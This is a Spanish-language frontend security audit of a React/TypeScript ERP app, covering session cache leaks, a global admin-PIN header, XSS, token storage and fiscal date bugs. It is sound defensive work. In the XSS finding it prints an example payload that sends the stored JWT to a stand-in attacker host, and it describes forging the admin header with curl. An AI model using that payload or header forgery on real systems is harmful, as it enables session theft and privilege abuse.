# Frontend Security & Technical Audit — GenSuite Web

**Repositorio:** `gensuite-web`
**Rama auditada:** `facturacion-eletronica` (commit `79a94d2`)
**Fecha:** 2026-08-28
**Alcance:** 301 archivos TypeScript/TSX, ~85.000 líneas, `src/` completo + configuración + dependencias.
**Método:** análisis estático de lectura no destructiva. No se modificó ningún archivo del proyecto.

> **Nota de integridad del análisis.** Durante la auditoría el árbol de trabajo fue modificado por otro
> proceso ajeno a esta sesión: aparecieron `src/features/ecf-emitidos/` y `src/shared/api/ecf-emitidos.ts`,
> y cambiaron `App.tsx`, `AppLayout.tsx`, `CommandPalette.tsx`, `endpoints.ts`, `types.ts`, `lib/dgii.ts`.
> **Ese módulo `ecf-emitidos` NO está cubierto por este informe.** Todos los hallazgos y números de línea
> corresponden al estado leído (commit `79a94d2`) y deben re-verificarse contra HEAD antes de remediar.

---

## Executive Summary

GenSuite Web es un ERP/facturación SPA (React 19 + Vite 8 + TanStack Query + Zustand) que consume un BFF
NestJS que a su vez habla con ERPNext. Es una aplicación grande, funcionalmente rica y con un nivel de
cuidado notable en detalles de dominio fiscal dominicano (NCF, e-CF, DGII, retenciones, 606). La calidad
del código de dominio es, en general, buena: hay comentarios explicativos de alto valor, normalización
defensiva en algunos clientes de API y separación razonable por features.

Sin embargo, **la capa transversal de sesión, seguridad y resiliencia está sustancialmente por debajo del
nivel del código de dominio**, y ahí se concentra el riesgo. Los dos hallazgos críticos son de la misma
familia: *estado privilegiado que sobrevive al cierre de sesión*.

1. El `QueryClient` es un singleton de módulo y **el logout nunca lo limpia**. Como el logout es una
   navegación cliente (sin recarga), el usuario siguiente hereda en memoria facturas, clientes, reportes
   y saldos del usuario anterior.
2. Tres formularios fijan `client.defaults.headers.common['X-Admin-Pin']` de forma **global y permanente**
   tras una autorización por PIN. Nunca se borra, ni al cambiar de página ni al cerrar sesión.

Sumado a esto: no existe ningún **Error Boundary** en toda la aplicación, no hay **timeout HTTP**, no hay
**cancelación de peticiones**, no hay **manejo de expiración/refresh de sesión**, no hay **guardas de rol
en las rutas**, y la fecha "hoy" se calcula en **UTC** en 30 sitios — lo que en República Dominicana (UTC−4)
asigna la fecha del día siguiente a todo documento contable creado después de las 20:00 hora local.

No hay tests (0) ni CI/CD (0). Eso amplifica cada uno de los puntos anteriores: no existe red de seguridad
para detectar regresiones en flujos que mueven dinero.

**Veredicto:** la aplicación es funcional y está bien construida en su lógica de negocio, pero **no está
lista para producción multiusuario** sin resolver los dos hallazgos críticos y el bloque P1. El riesgo
dominante no es un atacante externo sofisticado: es **fuga de datos entre usuarios en un equipo compartido**
(escenario totalmente realista en caja, mostrador y contabilidad) y **corrupción de fechas fiscales**.

### Distribución de hallazgos

| Severidad | Cantidad |
|-----------|----------|
| CRITICAL  | 2  |
| HIGH      | 9  |
| MEDIUM    | 14 |
| LOW       | 8  |
| INFO      | 7  |
| **Total** | **40** |

---

## Project Overview

| Aspecto | Detalle |
|---|---|
| Framework | React 19.2.6 (SPA, sin SSR) |
| Build | Vite 8.0.12 + `@vitejs/plugin-react` 6 |
| Lenguaje | TypeScript ~6.0.2, `strict: true`, `noUnusedLocals`, `noUnusedParameters` |
| Routing | `react-router-dom` 7.17.0 (`BrowserRouter`, ~150 rutas) |
| Estado servidor | `@tanstack/react-query` 5.101.0 |
| Estado cliente | `zustand` 5.0.14 (un único store: `auth.store.ts`) |
| HTTP | `axios` 1.17.0, instancia única en `src/shared/api/client.ts` |
| Formularios | `react-hook-form` 7.77 + `zod` 4.4.3 + `@hookform/resolvers` (uso parcial) |
| UI | Radix UI, Tailwind 4.3, `lucide-react`, `sonner` (toasts), `cmdk` |
| Otros | `exceljs`, `recharts`, `qrcode.react`, `react-barcode`, `react-moveable`, `keepalive-for-react` |
| Tests | **Ninguno** |
| CI/CD | **Ninguno** (`.github/` no existe) |
| Lockfiles | `package-lock.json` **y** `pnpm-lock.yaml` (ambos presentes) |

### Estructura

```
src/
├── App.tsx                  # 150+ rutas, todas lazy salvo login/start
├── main.tsx                 # QueryClient global + hydrate() + render
├── stores/auth.store.ts     # Único store Zustand
├── contexts/TabsContext.tsx # Sistema de multipestañas propio
├── shared/api/              # 52 módulos: client, storage, endpoints, types (4.641 líneas) + 1 por dominio
├── shared/hooks/            # useDirtyCheck, useConfirmClose, useIsSystemManager, ...
├── shared/ui/               # Modal, SearchableSelect, ...
├── components/
│   ├── ProtectedRoute.tsx   # Única guarda de ruta (solo autenticación)
│   ├── layout/AppLayout.tsx # 1.441 líneas: sidebar, nav, tabs, tema, logout
│   └── shared/              # PinModal, PdfPreviewModal, EcfStatusCard, ...
├── features/                # 28 dominios (invoicing, compras, gastos, tesoreria, ecf-recibidos, ...)
├── lib/                     # formatters, paymentLines, dgii, validators/dgii, constants
└── pages/                   # LoginPage, ForgotPassword, ResetPassword, StartPage, NotFound
```

### Archivos más grandes (deuda estructural)

| Archivo | Líneas |
|---|---|
| `src/shared/api/types.ts` | 4.641 (372 interfaces) |
| `src/features/config/ConfigPage.tsx` | 3.217 |
| `src/features/invoicing/InvoiceDetail.tsx` | 2.654 |
| `src/features/invoicing/InvoiceForm.tsx` | 1.540 |
| `src/features/catalog/ItemDetail.tsx` | 1.484 |
| `src/features/compras/CompraForm.tsx` | 1.468 |
| `src/components/layout/AppLayout.tsx` | 1.441 |

---

## Architecture Analysis

### Flujo de una operación

```
Usuario
  └─> Ruta (App.tsx, lazy + Suspense)
       └─> ProtectedRoute        ← SOLO comprueba isAuthenticated. No hay control de rol.
            └─> AppLayout        ← sidebar filtrado por rol (cosmético) + KeepAlive(max=15)
                 └─> Feature Page
                      └─> useQuery / useMutation (TanStack Query)
                           └─> src/shared/api/<dominio>.ts
                                └─> client (axios)
                                     ├─ request interceptor: Authorization: Bearer <token>
                                     │                        X-Tenant: <slug de localStorage>
                                     │                        [X-Admin-Pin: <userId> si se fijó alguna vez]
                                     └─> NestJS BFF ──> ERPNext
                                          └─ response interceptor:
                                               401 (no-login) -> clearSession + window.location.href='/login'
                                               ERPNEXT_AUTH_ERROR -> clearSession + redirect
                                               resto -> reject(data.error)
                                └─> unwrap() / unwrapPaginated()
                      └─> Cache de React Query (staleTime 5 min, retry 1, sin refetchOnWindowFocus)
                           └─> Render
```

### Observaciones arquitectónicas

**Positivas.** La separación `features/` + `shared/api/` es clara y consistente. `ENDPOINTS` centraliza
todas las rutas del BFF en un único objeto, lo que hace trivial auditar la superficie de API. Los helpers
`unwrap`/`unwrapPaginated`/`unwrapRaw` normalizan el sobre `{success, data}` en un solo lugar. El lazy
loading por ruta está aplicado de forma casi completa.

**Problemáticas.**

1. **No existe capa de sesión.** `auth.store.ts` guarda token/user/tenant, pero nadie es responsable del
   *ciclo de vida* de la sesión: no hay expiración, no hay refresh, no hay invalidación coordinada de
   cachés, no hay sincronización entre pestañas. El logout es una función de 2 líneas que limpia
   localStorage y el store, y nada más (FE-001, FE-002, FE-011).

2. **El singleton de axios acumula estado global mutable.** `client.defaults.headers.common` se muta desde
   componentes de feature (FE-002). Es un canal lateral invisible: nada en la firma de las funciones de
   `shared/api/` indica que sus peticiones llevan un header privilegiado.

3. **Autorización solo cosmética.** `stripAdminOnlyEntry` filtra el menú lateral, pero ni las rutas ni el
   `CommandPalette` respetan ese filtro. La autorización real recae 100 % en el BFF — lo cual es correcto
   como principio, pero la UI no lo refleja y produce estados rotos (FE-009).

4. **Sin fronteras de fallo.** No hay Error Boundary. React 19 desmonta todo el árbol ante una excepción
   de render, y la app entera queda en blanco (FE-005). No hay ningún punto de recuperación.

5. **`types.ts` de 4.641 líneas y 372 interfaces** es un cuello de botella: toda modificación de tipos
   toca un archivo que importa prácticamente toda la app, invalidando caché de compilación (FE-037).

---

## Risk Summary

| ID | Severity | Probability | Impact | Confidence | Area | Priority |
|---|---|---|---|---|---|---|
| FE-001 | CRITICAL | Alta | Alto | Confirmed | Session / Privacy | P0 |
| FE-002 | CRITICAL | Media | Alto | Confirmed | Access Control | P0 |
| FE-003 | HIGH | Media | Alto | Confirmed | XSS | P1 |
| FE-004 | HIGH | Media | Alto | Confirmed | Token Storage | P1 |
| FE-005 | HIGH | Alta | Alto | Confirmed | Reliability | P1 |
| FE-006 | HIGH | Alta | Medio | Confirmed | Correctness (React) | P1 |
| FE-007 | HIGH | Alta | Alto | Confirmed | Financial / Fiscal | P1 |
| FE-008 | HIGH | Alta | Medio | Confirmed | Session | P1 |
| FE-009 | HIGH | Alta | Medio | Confirmed | Authorization | P1 |
| FE-010 | HIGH | Alta | Medio | Confirmed | Resilience | P1 |
| FE-011 | HIGH | Media | Alto | Confirmed | Privacy | P1 |
| FE-012 | MEDIUM | Media | Medio | Confirmed | API Integration | P2 |
| FE-013 | MEDIUM | Alta | Bajo | Confirmed | Error Handling | P2 |
| FE-014 | MEDIUM | Baja | Medio | Probable | Open Redirect | P2 |
| FE-015 | MEDIUM | Media | Medio | Confirmed | Multi-tab Session | P2 |
| FE-016 | MEDIUM | Alta | Bajo | Confirmed | Financial | P2 |
| FE-017 | MEDIUM | Alta | Medio | Confirmed | Functional | P2 |
| FE-018 | MEDIUM | Media | Medio | Confirmed | Functional | P2 |
| FE-019 | MEDIUM | Media | Bajo | Confirmed | React Correctness | P2 |
| FE-020 | MEDIUM | Alta | Bajo | Confirmed | Performance / Memory | P2 |
| FE-021 | MEDIUM | Alta | Alto | Confirmed | Deployment Config | P1 |
| FE-022 | MEDIUM | Alta | Bajo | Confirmed | Info Disclosure | P2 |
| FE-023 | MEDIUM | Media | Medio | Confirmed | Dependencies | P2 |
| FE-024 | MEDIUM | Alta | Medio | Confirmed | Accessibility | P2 |
| FE-025 | MEDIUM | Alta | Medio | Confirmed | Accessibility | P3 |
| FE-026 | LOW | Alta | Alto | Confirmed | Testing | P1 |
| FE-027 | LOW | Media | Bajo | Confirmed | Config / Secrets | P2 |
| FE-028 | LOW | Media | Bajo | Confirmed | Dependencies | P3 |
| FE-029 | LOW | Media | Bajo | Probable | Downloads | P3 |
| FE-030 | LOW | Alta | Bajo | Confirmed | Performance | P3 |
| FE-031 | LOW | Media | Medio | Confirmed | Resilience | P2 |
| FE-032 | LOW | Baja | Medio | Potential | Multi-tenancy | P2 |
| FE-033 | LOW | Media | Alto | Probable | Data Integrity | P2 |
| FE-034 | INFO | — | — | Confirmed | Crypto Handling | P3 |
| FE-035 | INFO | — | — | Confirmed | Hardening | P2 |
| FE-036 | INFO | — | — | Confirmed | Auth Design | P3 |
| FE-037 | INFO | — | — | Confirmed | Maintainability | P3 |
| FE-038 | INFO | — | — | Confirmed | Auth Design | P3 |
| FE-039 | INFO | — | — | Confirmed | Concurrency | P2 |
| FE-040 | INFO | — | — | Confirmed | Repo Hygiene | P3 |

**Leyenda de prioridad:** P0 corregir inmediatamente · P1 antes de producción · P2 próximamente · P3 mejora futura.

---

## Top 10 Critical Findings

```
1. Caché de React Query sobrevive al logout — el usuario B ve datos del usuario A
   Severity:      CRITICAL
   Impact:        Fuga de datos financieros entre usuarios en equipos compartidos
   Why it matters: El logout no recarga la página; el QueryClient es un singleton de módulo
                   que nadie limpia. Facturas, clientes, saldos y reportes del usuario
                   anterior siguen en memoria y se sirven de inmediato (staleTime 5 min).
   Location:      src/main.tsx:9-19 · src/stores/auth.store.ts:65-68 ·
                  src/components/layout/AppLayout.tsx:1103-1106

2. Header X-Admin-Pin global y permanente — la elevación por PIN nunca caduca
   Severity:      CRITICAL
   Impact:        Persistencia de privilegio; se hereda al siguiente usuario de la sesión
   Why it matters: Se escribe en client.defaults.headers.common y no se borra jamás:
                   ni al cerrar el modal, ni al cambiar de página, ni al hacer logout.
   Location:      src/features/invoicing/InvoiceForm.tsx:1479 ·
                  src/features/pedidos/PedidoForm.tsx:882 ·
                  src/features/quotations/QuotationForm.tsx:1099

3. Fecha "hoy" calculada en UTC — documentos contables con fecha del día siguiente
   Severity:      HIGH
   Impact:        Facturas, pagos, asientos y gastos mal fechados a partir de las 20:00 (UTC-4)
   Why it matters: new Date().toISOString().slice(0,10) devuelve la fecha UTC. En RD toda
                   operación nocturna (caja, turnos) se asienta en el período equivocado.
   Location:      30 ocurrencias — InvoiceForm, CompraForm, GastoForm, PagoPage,
                  JournalForm.tsx:53, ReportesPage.tsx:117-118, NcfPage.tsx:169, ...

4. Sin ningún Error Boundary — cualquier excepción de render deja la app en blanco
   Severity:      HIGH
   Impact:        Pérdida total de la interfaz y del trabajo no guardado
   Why it matters: React 19 desmonta el árbol completo. No hay punto de recuperación en
                   ninguna de las ~150 rutas.
   Location:      Ausencia global (búsqueda de componentDidCatch/getDerivedStateFromError: 0)

5. useQuery condicional dentro de .map() — violación de las reglas de hooks
   Severity:      HIGH
   Impact:        Crash garantizado ("Rendered fewer hooks than expected") → pantalla en blanco
   Why it matters: El número de hooks depende de item.attributes.length. Si el refetch
                   devuelve otro número de atributos, React lanza. Combinado con FE-005,
                   el resultado es una app inutilizable.
   Location:      src/features/catalog/ItemDetail.tsx:252-259 y 313-320

6. JWT en localStorage con un sink de XSS activo en la misma app
   Severity:      HIGH
   Impact:        Robo de token → suplantación completa de sesión
   Why it matters: El token es legible por cualquier JS. FE-003 provee el vector de ejecución.
   Location:      src/shared/api/storage.ts:4,59-69 · sink en GastoForm.tsx:655

7. XSS por dangerouslySetInnerHTML alimentado con un mensaje del backend/ERPNext
   Severity:      HIGH
   Impact:        Ejecución de JS arbitrario en el contexto de la aplicación
   Why it matters: gastoData.message se inyecta como HTML crudo sin sanitizar. ERPNext
                   emite mensajes con HTML y su contenido es influenciable desde datos
                   de negocio.
   Location:      src/features/gastos/GastoForm.tsx:655 (origen: líneas 234-235)

8. Sin timeout HTTP — la UI se cuelga indefinidamente si el BFF o ERPNext no responden
   Severity:      HIGH
   Impact:        Loading infinito, botones bloqueados, usuario sin salida
   Why it matters: axios.create() sin `timeout`. ERPNext es conocido por respuestas lentas
                   bajo carga; una petición colgada nunca resuelve ni rechaza.
   Location:      src/shared/api/client.ts:10-13

9. Sin control de rol en rutas + CommandPalette expone rutas de administración
   Severity:      HIGH
   Impact:        Estados de UI rotos, 403 en cadena, falsa expectativa de acceso
   Why it matters: ProtectedRoute solo valida isAuthenticated. El menú oculta lo admin,
                   pero Ctrl+K y la URL directa no.
   Location:      src/components/ProtectedRoute.tsx · src/App.tsx (sin guardas) ·
                  src/components/layout/CommandPalette.tsx:74

10. Sin manejo de expiración de sesión ni refresh token
    Severity:      HIGH
    Impact:        Pérdida de trabajo no guardado sin aviso; redirección dura a /login
    Why it matters: Ante un 401 se hace window.location.href='/login', descartando
                    formularios en curso. No hay refresh ni reintento de la petición.
    Location:      src/shared/api/client.ts:56-60
```

---

## Critical Findings

### [FE-001] La caché de React Query sobrevive al cierre de sesión

**Severity:** CRITICAL
**Confidence:** Confirmed
**Category:** Security / Privacy / Session Management
**Priority:** P0

#### Description

El `QueryClient` se instancia una sola vez en el ámbito de módulo de `main.tsx` y vive mientras el
documento no se recargue. El logout limpia `localStorage` y el store de Zustand, pero **no toca la caché
de React Query**. Como además el logout navega con el router (`navigate("/login")`) en lugar de forzar una
recarga del documento, **no hay ningún momento en el que la caché se destruya**.

Una búsqueda exhaustiva confirma que `queryClient.clear()` **no aparece en ninguna parte del código**. Los
únicos usos de `removeQueries` son puntuales, dentro de formularios, para invalidar un registro concreto
tras editarlo (10 ocurrencias, todas del tipo `removeQueries({ queryKey: ['customer', id] })`).

Agravante: **las query keys no están segmentadas por usuario ni por tenant**. Claves como `['invoices',
params]`, `['customers']`, `['cuentas-bancarias']` o `['dashboard']` son idénticas para cualquier usuario,
de modo que la entrada de caché del usuario A **coincide exactamente** con la que solicitará el usuario B.

Con `staleTime: 1000 * 60 * 5` (5 minutos) y `refetchOnWindowFocus: false`, los datos cacheados se
consideran frescos y **se sirven de inmediato desde memoria sin ninguna petición de red**.

#### Location

- `src/main.tsx:9-19` — creación del `QueryClient` en ámbito de módulo
- `src/stores/auth.store.ts:65-68` — `logout()`
- `src/components/layout/AppLayout.tsx:1103-1106` — `handleLogout()`

#### Evidence

```ts
// src/main.tsx:9-19  — instancia única, viva durante toda la vida del documento
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 1000 * 60 * 5,   // 5 min considerados frescos
      retry: 1,
      refetchOnWindowFocus: false, // no revalida al volver a la pestaña
    },
  },
})
```

```ts
// src/stores/auth.store.ts:65-68  — el logout ignora por completo la caché
logout: () => {
  clearSession()                                                  // solo localStorage
  set({ token: null, user: null, tenant: null, isAuthenticated: false })
},
```

```ts
// src/components/layout/AppLayout.tsx:1103-1106
const handleLogout = () => {
  logout();
  navigate("/login", { replace: true });  // navegación SPA: NO recarga el documento
};
```

#### Failure / Attack Scenario

Escenario realista en un mostrador o una caja con un equipo compartido:

1. La contadora inicia sesión, abre `/facturas`, `/cobros/aging` y `/reportes/606`.
   React Query cachea `['invoices', {...}]`, `['aging-cxc']`, `['reporte-606', {...}]`.
2. Pulsa "Cerrar sesión". Se limpian `localStorage` y el store. **La caché queda intacta.**
3. Un cajero con permisos mínimos inicia sesión en el mismo navegador, sin recargar la página.
4. Navega a `/facturas`. React Query encuentra `['invoices', {...}]` fresca (< 5 min) y **renderiza
   inmediatamente las facturas de la contadora**, sin emitir ninguna petición que el backend pudiera
   rechazar con 403.

El BFF nunca llega a intervenir: la fuga ocurre enteramente en el cliente. Ninguna validación de backend
puede prevenirla.

La misma mecánica aplica a la vuelta desde `/login` cuando el usuario simplemente vuelve atrás en el
historial, y al escenario de sesión expirada (FE-008), donde el redirect sí recarga y por tanto *no* filtra
— la incoherencia entre ambos caminos hace el bug difícil de detectar en pruebas manuales.

#### Impact

Exposición de información financiera y de clientes entre usuarios con distintos niveles de privilegio:
facturas, cuentas por cobrar/pagar, saldos, reportes fiscales 606/607, datos de clientes y proveedores,
movimientos bancarios y cheques. En un ERP con datos fiscales de terceros esto tiene además implicaciones
de protección de datos.

#### Likelihood

**Alta.** No requiere atacante. Basta el uso normal de un equipo compartido — el patrón exacto para el que
está diseñado el módulo de caja/turnos de esta misma aplicación.

#### Recommendation

1. Limpiar la caché en el logout, de forma centralizada:
   ```
   queryClient.clear()   // además de clearSession()
   ```
   El `QueryClient` debe ser accesible desde el store (inyectándolo) o el logout debe vivir en un hook de
   React que pueda usar `useQueryClient()`.
2. **Además**, forzar una recarga dura del documento en el logout (`window.location.replace('/login')`).
   Es la única garantía de que no queda estado en memoria (caché, refs de módulo, headers de axios — véase
   FE-002). Es la mitigación más barata y cubre FE-001, FE-002 y FE-011 a la vez.
3. Como defensa en profundidad, **segmentar las query keys por identidad**: prefijar todas las claves con
   el tenant y el usuario (p. ej. `[tenant, userEmail, 'invoices', params]`). Así una colisión entre
   usuarios deja de ser posible aunque la caché no se limpie.
4. Considerar `gcTime` bajo para datos sensibles.

#### Related Components

FE-002 (misma raíz: estado global que sobrevive al logout), FE-011 (borradores y pestañas persistidas),
FE-015 (desincronización entre pestañas), FE-008 (el camino de sesión expirada sí recarga — incoherencia).

---

### [FE-002] `X-Admin-Pin` se fija globalmente en axios y nunca se elimina

**Severity:** CRITICAL
**Confidence:** Confirmed
**Category:** Broken Access Control / Session Management
**Priority:** P0

#### Description

Cuando un descuento supera el límite del usuario, la UI abre `PinModal` para que un administrador autorice
la operación con un PIN de 4 dígitos. Al validarse el PIN contra `POST /auth/verify-admin-pin`, los tres
formularios que usan este flujo ejecutan:

```ts
client.defaults.headers.common['X-Admin-Pin'] = userId
```

Esto muta **los defaults de la instancia compartida de axios**. A partir de ese instante, y hasta que el
documento se recargue, **todas las peticiones de la aplicación** —a cualquier endpoint, de cualquier
módulo— llevan ese header.

Tres problemas independientes, cada uno serio:

1. **La elevación no está acotada a la operación.** Se autoriza *un* descuento y queda elevada *toda* la
   sesión. Nada la revoca: ni cerrar el modal, ni completar el guardado, ni navegar, ni cambiar de pestaña.
2. **La elevación sobrevive al logout.** El logout es una navegación SPA (FE-001), así que el módulo
   `client.ts` no se re-evalúa y `defaults.headers.common` conserva el valor. **El siguiente usuario que
   inicie sesión en ese navegador emite todas sus peticiones con el `X-Admin-Pin` del administrador
   anterior.**
3. **Se envía el `userId`, no el PIN.** El valor es el identificador del administrador que autorizó
   (`res.userId`, con fallback a la cadena literal `'Administrador'`). Si el BFF trata este header como
   señal de autorización, un atacante solo necesita adivinar un identificador de administrador —o usar el
   fallback— y añadir el header manualmente con curl. No hay ningún secreto involucrado.

El fallback merece énfasis: `PinModal.tsx:23` hace `(res as any)?.userId ?? 'Administrador'`. Si el backend
no devuelve `userId`, **todas las peticiones se envían con `X-Admin-Pin: Administrador`**, un valor
constante y trivialmente adivinable.

#### Location

- `src/features/invoicing/InvoiceForm.tsx:1479`
- `src/features/pedidos/PedidoForm.tsx:882`
- `src/features/quotations/QuotationForm.tsx:1099`
- `src/components/shared/PinModal.tsx:23` — origen del `userId` y del fallback
- `src/shared/api/client.ts:10-13` — instancia compartida mutada

#### Evidence

```tsx
// src/features/pedidos/PedidoForm.tsx:880-885
onAuthorized={(userId) => {
  client.defaults.headers.common['X-Admin-Pin'] = userId   // global, permanente
  setPinModalOpen(false)
  submitDto()
}}
```

```tsx
// src/features/quotations/QuotationForm.tsx:1099  — idéntico, en una sola línea
onAuthorized={(userId) => { client.defaults.headers.common['X-Admin-Pin'] = userId; setPinModalOpen(false); submitDto() }}
```

```tsx
// src/components/shared/PinModal.tsx:22-26
onSuccess: (res) => {
  const userId = (res as any)?.userId ?? 'Administrador'   // fallback constante
  setAuthorizedUser(userId)
  toast.success(`Autorizado por ${userId}`)
  setTimeout(() => { onAuthorized(userId); reset() }, 800)
},
```

Búsqueda exhaustiva de limpieza del header:

```
grep -rn "X-Admin-Pin|defaults.headers" src/
  → src/features/pedidos/PedidoForm.tsx:882       (asignación)
  → src/features/quotations/QuotationForm.tsx:1099 (asignación)
  → src/features/invoicing/InvoiceForm.tsx:1479    (asignación)
```

Tres asignaciones. **Cero eliminaciones.** No existe ningún `delete client.defaults.headers.common['X-Admin-Pin']`.

#### Failure / Attack Scenario

**Escenario A — persistencia de privilegio dentro de la misma sesión.**
Un vendedor necesita aplicar un descuento del 40 % (por encima de su límite del 10 %). Llama al supervisor,
que teclea su PIN. El descuento se aprueba. A partir de ahí el vendedor puede crear **cualquier número** de
cotizaciones, pedidos y facturas con descuentos ilimitados durante el resto del día: cada petición sigue
llevando el header de autorización del supervisor, que ya se marchó.

**Escenario B — herencia entre usuarios.**
El supervisor autoriza un descuento en la caja 1. Cierra sesión. El cajero del turno de noche inicia sesión
en el mismo navegador. Todas sus peticiones —incluidas las de anulación de facturas o ajuste de inventario—
viajan con `X-Admin-Pin` del supervisor. Si el BFF concede algún privilegio por ese header, el cajero opera
con permisos que nunca se le otorgaron, y la traza de auditoría del backend atribuirá esas acciones al
supervisor.

**Escenario C — falsificación directa.**
Un usuario abre DevTools, observa el header en cualquier petición y reproduce la llamada con
`X-Admin-Pin: Administrador` (o el identificador que haya visto). No hay secreto que robar: el valor
transmitido es un identificador, no una prueba criptográfica de autorización.

#### Impact

Elusión del control de descuento máximo y —según cómo interprete el BFF el header— de cualquier otra
comprobación que dependa de él. Corrupción de la trazabilidad de auditoría: acciones atribuidas al
administrador que autorizó una única operación distinta, potencialmente en otra sesión y otro día.
En un sistema de facturación fiscal, la integridad de la traza de quién autorizó qué es un requisito
de cumplimiento, no una comodidad.

#### Likelihood

**Media-Alta.** El escenario A ocurre sin intención alguna en el uso normal. El escenario B requiere un
equipo compartido, que es exactamente el caso de uso de caja. El escenario C requiere intención, pero es
trivial de ejecutar.

#### Recommendation

1. **No usar `defaults` para autorizaciones puntuales.** Pasar el header por petición, únicamente en la
   llamada que fue autorizada:
   ```
   createInvoice(dto, { headers: { 'X-Admin-Pin': pin } })
   ```
   Así la elevación es imposible de propagar por construcción.
2. **Transmitir el PIN, no el `userId`** —o, mejor, que el backend devuelva un **token de autorización de
   un solo uso y corta vida**, ligado a la operación concreta (importe, documento, tipo de excepción), y
   enviar ese token. Un identificador de usuario no es una credencial.
3. **Eliminar el fallback `'Administrador'`.** Si el backend no devuelve `userId`, la autorización debe
   considerarse fallida, no sustituirse por una constante.
4. **Confirmar con el equipo de NestJS** qué hace exactamente el BFF con `X-Admin-Pin`. Si concede algún
   privilegio basándose en él, es una vulnerabilidad de backend de severidad crítica por sí sola y debe
   tratarse en ese repositorio. *Esto no es una vulnerabilidad del frontend por sí mismo si el backend
   valida correctamente el PIN contra la operación concreta — pero debe confirmarse que el backend no
   confía en este header como prueba de autorización.*
5. Mientras tanto, mitigación inmediata: recarga dura en el logout (cubre también FE-001).

#### Related Components

FE-001 (misma raíz), FE-036 (diseño del PIN), FE-009 (autorización), `PinModal`, `InvoiceForm`,
`PedidoForm`, `QuotationForm`.

---

## High Findings

### [FE-003] XSS por `dangerouslySetInnerHTML` con contenido del backend/ERPNext

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Security / XSS
**Priority:** P1

#### Description

`GastoForm` muestra un mensaje informativo devuelto por el backend (por ejemplo, el aviso de cambio
automático de cuenta contable) inyectándolo como **HTML crudo**, sin sanitizar.

Es el **único** `dangerouslySetInnerHTML` de todo el proyecto —y no hay ningún uso de `innerHTML`,
`outerHTML`, `insertAdjacentHTML` ni `document.write`—, lo que significa que la superficie de XSS por
inyección de HTML es pequeña y **cerrable con un cambio de una línea**.

El dato proviene de `gastoData.message`, es decir, de la respuesta de `GET /gastos/:id` del BFF, que a su
vez la origina en ERPNext. ERPNext emite habitualmente mensajes con marcado HTML (`<b>`, `<a>`), lo que
explica por qué se eligió `dangerouslySetInnerHTML`; pero ese mismo hecho confirma que el campo transporta
HTML y que su contenido puede incorporar datos de negocio editables por usuarios.

#### Location

- `src/features/gastos/GastoForm.tsx:655` — el sink
- `src/features/gastos/GastoForm.tsx:152` — declaración del estado
- `src/features/gastos/GastoForm.tsx:233-235` — asignación desde la respuesta de la API

#### Evidence

```tsx
// src/features/gastos/GastoForm.tsx:652-657
{isEdit && serverMessage && (
  <div className="inline-alert inline-alert-info">
    <AlertTriangle size={16} />
    <span dangerouslySetInnerHTML={{ __html: serverMessage }} />
  </div>
)}
```

```tsx
// src/features/gastos/GastoForm.tsx:233-235  — origen del dato
// Extraer y mostrar el mensaje del servidor (ej. cambio automático de cuenta contable)
const rawMsg = (gastoData as { message?: string }).message
setServerMessage(rawMsg ?? null)
```

Nótese el `as { message?: string }`: el campo **ni siquiera está en el tipo** del gasto. Es un canal
lateral no tipado, lo que dificulta razonar sobre su procedencia y su contenido.

#### Failure / Attack Scenario

La explotabilidad depende de si algún dato controlable por un usuario acaba interpolado en ese mensaje del
lado de ERPNext o del BFF. Vectores plausibles, en orden de probabilidad:

1. **Nombre de cuenta contable o de proveedor.** Si el mensaje es del tipo
   *"Se cambió la cuenta a &lt;b&gt;{nombre_cuenta}&lt;/b&gt;"*, un usuario con permiso para crear cuentas o
   proveedores puede nombrar el registro
   `<img src=x onerror="fetch('https://atacante/?t='+localStorage.getItem('gensuite:token:v1'))">`.
   Al abrir cualquier gasto que dispare ese mensaje, la víctima ejecuta el script y **envía su JWT al
   atacante** (véase FE-004: el token es legible desde JS).
2. **Datos provenientes de un e-CF recibido de un tercero.** El módulo `ecf-recibidos` ingiere XML firmado
   emitido por proveedores externos (`cargarManualEcf`). Si alguno de esos campos alimenta un gasto y luego
   un mensaje del servidor, el vector queda **fuera del perímetro de confianza de la organización**.
3. **Respuesta manipulada.** Un atacante con posición de red (recordemos que el backend es HTTP plano en
   `207.180.235.134:4000`) puede inyectar HTML en la respuesta.

Aunque hoy ninguno de estos vectores estuviera activo, el sink permanece: cualquier cambio futuro en el
mensaje que emite ERPNext lo convierte en explotable sin que nada en el frontend lo señale.

#### Impact

Ejecución de JavaScript arbitrario en el origen de la aplicación: robo del JWT desde `localStorage`,
suplantación completa de la sesión, ejecución de operaciones (crear/anular facturas, pagos) en nombre de la
víctima, y lectura de todo lo que la víctima puede ver.

#### Likelihood

**Media.** Requiere que un dato controlable llegue al mensaje. Dado que el campo no está tipado ni
documentado, esa condición no puede descartarse y **no está protegida por ninguna barrera**.

#### Recommendation

1. **Renderizar como texto plano.** Es la corrección correcta y de coste nulo:
   ```
   <span>{serverMessage}</span>
   ```
   Se pierde el formato (negritas, enlaces) que ERPNext pudiera incluir; a cambio se elimina la clase
   completa de vulnerabilidad. Para un mensaje informativo secundario, es el intercambio correcto.
2. Si el formato es imprescindible, sanitizar con una allowlist estricta (DOMPurify con
   `ALLOWED_TAGS: ['b','i','strong','em']` y sin atributos) antes de inyectar.
3. **Tipar el campo** en la interfaz del gasto en `types.ts` en lugar de accederlo con un cast, para que su
   existencia y su origen sean visibles en revisión de código.
4. Añadir una regla de ESLint (`react/no-danger`) que obligue a justificar explícitamente cualquier uso
   futuro.

#### Related Components

FE-004 (el token en `localStorage` es lo que convierte este XSS en un robo de sesión), FE-035 (una CSP
mitigaría la exfiltración), `ecf-recibidos` (fuente de datos externa no confiable).

---

### [FE-004] JWT almacenado en `localStorage`, legible por JavaScript

**Severity:** HIGH
**Confidence:** Confirmed
**Category:** Security / Token Storage
**Priority:** P1

#### Description

El token de acceso se guarda en `localStorage` bajo la clave `gensuite:token:v1`, junto con el objeto de
usuario (`gensuite:user:v1`) y el tenant (`gensuite:tenant:v1`). `localStorage` es accesible por cualquier
JavaScript que se ejecute en el origen, persiste indefinidamente (sobrevive al cierre del navegador) y no
ofrece las protecciones de una cookie `HttpOnly`.

Este hallazgo **no es independiente de FE-003**: es la combinación de ambos lo que produce el riesgo real.
Un XSS sin token accesible obliga al atacante a operar dentro de la sesión de la víctima en tiempo real; un
XSS con el token en `localStorage` le permite **exfiltrarlo y usarlo después, desde su propia máquina**, sin
límite de tiempo mientras el token siga siendo válido.

